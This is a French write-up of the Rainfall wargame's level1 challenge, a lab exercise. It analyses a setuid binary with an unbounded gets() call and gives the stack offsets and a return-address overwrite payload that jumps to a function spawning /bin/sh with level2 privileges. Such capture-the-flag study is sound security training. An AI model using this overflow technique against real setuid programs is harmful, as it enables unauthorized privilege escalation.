# Level1 — Analyse technique

## Binaire

- **Type :** ELF 32-bit LSB, i386, **dynamically linked**, not stripped.
- **Setuid setgid** level2.
- **Imports :** `gets`, `fwrite`, `system`, `__libc_start_main`.
- **Strings :** "Good... Wait what?\n", "/bin/sh".

## Fonctions

| Fonction | Adresse   | Rôle |
|----------|-----------|------|
| main     | 0x08048480 | Alloue 0x50 bytes, appelle `gets(buffer)` avec buffer à esp+0x10. |
| run      | 0x08048444 | `fwrite("Good... Wait what?\n", 1, 0x13, stdout)` puis `system("/bin/sh")`. Jamais appelée par le flux normal. |

## Logique de main (objdump)

```
8048486:	sub    $0x50,%esp          # frame 80 bytes
8048489:	lea    0x10(%esp),%eax    # buffer à esp+0x10
804848d:	mov    %eax,(%esp)
8048490:	call   gets@plt            # gets(buffer) — pas de limite
8048495:	leave
8048496:	ret
```

## Stack layout (main)

- `esp+0x10` : début du buffer (64 octets jusqu’à esp+0x4f).
- `esp+0x50` : saved EBP (4 octets).
- `esp+0x54` : adresse de retour.

**Offset théorique (binaire local) :** 0x54 - 0x10 = **68** octets. Sur la VM Rainfall, l’offset observé est souvent **76** (alignement/compilateur différent).

## Vulnérabilité

- **Classe :** buffer overflow sur buffer lu par `gets()` sans borne.
- **Cible :** remplacer l’adresse de retour par l’adresse de `run` (0x08048444) pour exécuter `system("/bin/sh")` avec les privilèges level2.

## Exploit

- **Padding :** essayer **76** octets (sinon 72 ou 80 selon la VM).
- **Adresse :** 0x08048444 (little endian : `\x44\x84\x04\x08`).
- **Payload :** `"A"*76 + "\x44\x84\x04\x08"`.
- **Shell interactif :** `( python -c '...'; cat ) | ./level1` pour garder stdin ouvert.

Pour un shell interactif, garder stdin ouvert : `( python -c '...'; cat ) | ./level1`.
